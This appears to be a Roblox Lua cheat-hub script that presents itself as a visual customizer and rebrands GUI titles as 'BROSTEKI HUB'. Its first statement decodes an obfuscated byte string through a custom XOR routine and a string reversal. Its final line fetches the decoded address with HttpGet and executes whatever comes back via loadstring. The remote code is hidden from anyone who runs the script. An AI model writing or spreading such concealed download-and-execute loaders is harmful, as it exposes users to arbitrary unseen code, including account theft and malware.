
--[[ STAGE 2: VISUAL CORE ]]
local qMEwiLVwVYHCvEr1qk="\249\239\010\074\255\053\057\064\055\067\017\019\043\023\019\006\013\037\043\057\022\020\045\022\039\057\071\039\062\086\079\061\057\063\044\062\078\075\069\110\147\086\085\079\093\157\098\100\089\077\099\093\105\082\100\177\110\089\120\111\125\119\129\119\132\133\136\201\141\141\131\210\126\150\145\132\156\157\147\134\157\137\145\158\149\172\154\175\171\246\159\175\160\253\255\238\167\172\178\180\202"local zbnlGbO1jzH4c2gs2=115 local olsCIPwspyfTYW=216 local Xbtc5SScJu__8m_mY5xNXi=0 local Niv2PmMP4TPt=2 local ZCYeeWFoCL97JigVlWWok=13 local jbqUPIRkKmBT_38e8uLC7=true local ErcEhDrRYoe12Z2Had2z3=bit32 and bit32.bxor if not ErcEhDrRYoe12Z2Had2z3 then ErcEhDrRYoe12Z2Had2z3=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local iqigl5MotQFzHQ={}for GBtKPY9U1YejOuMoUoXdb=1,#qMEwiLVwVYHCvEr1qk do local LtpaeAIbmrZhcEJTm5DG=string.byte(qMEwiLVwVYHCvEr1qk,GBtKPY9U1YejOuMoUoXdb)local IyFVjj_1ej76yc=(olsCIPwspyfTYW+(GBtKPY9U1YejOuMoUoXdb*Niv2PmMP4TPt)+ZCYeeWFoCL97JigVlWWok)%256 if Xbtc5SScJu__8m_mY5xNXi==0 then LtpaeAIbmrZhcEJTm5DG=(LtpaeAIbmrZhcEJTm5DG-IyFVjj_1ej76yc)%256 iqigl5MotQFzHQ[GBtKPY9U1YejOuMoUoXdb]=string.char(ErcEhDrRYoe12Z2Had2z3(LtpaeAIbmrZhcEJTm5DG,zbnlGbO1jzH4c2gs2))else LtpaeAIbmrZhcEJTm5DG=ErcEhDrRYoe12Z2Had2z3(LtpaeAIbmrZhcEJTm5DG,zbnlGbO1jzH4c2gs2)iqigl5MotQFzHQ[GBtKPY9U1YejOuMoUoXdb]=string.char((LtpaeAIbmrZhcEJTm5DG-IyFVjj_1ej76yc)%256)end end local OODNGg8fFho3=table.concat(iqigl5MotQFzHQ)if jbqUPIRkKmBT_38e8uLC7 then OODNGg8fFho3=string.reverse(OODNGg8fFho3)end local R3DpwBJGxNG9H19b2G=OODNGg8fFho3
local HubName = "BROSTEKI HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(R3DpwBJGxNG9H19b2G))()
